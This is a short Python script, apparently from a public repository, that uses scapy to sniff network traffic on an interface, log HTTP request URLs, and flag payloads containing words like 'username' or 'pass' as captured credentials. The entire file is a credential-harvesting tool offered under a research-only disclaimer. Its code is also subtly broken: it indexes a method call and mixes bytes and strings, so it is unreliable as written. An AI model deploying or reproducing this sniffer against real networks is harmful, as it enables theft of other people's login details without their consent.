print("----------------------------------------------------")
print('    S57 - Python - Packet_Sniffer')
print('    by @s57cyber https://github.com/s57cyber')
print("Disclaimer. This repository is for research purposes only, the use of this code is your responsibility. I take NO responsibility ... AT YOUR OWN RISK. Once again, ALL files available here are for EDUCATION and/or RESEARCH purposes ONLY.")
print("----------------------------------------------------")
"\n\n"

#!usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet.show[scapy.Raw].load
        keyword = ["username", "user", "login", "pass"]
        for keyword in keyword:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] possible username/password >>" + login_info + "\n\n")


sniff("eth0")

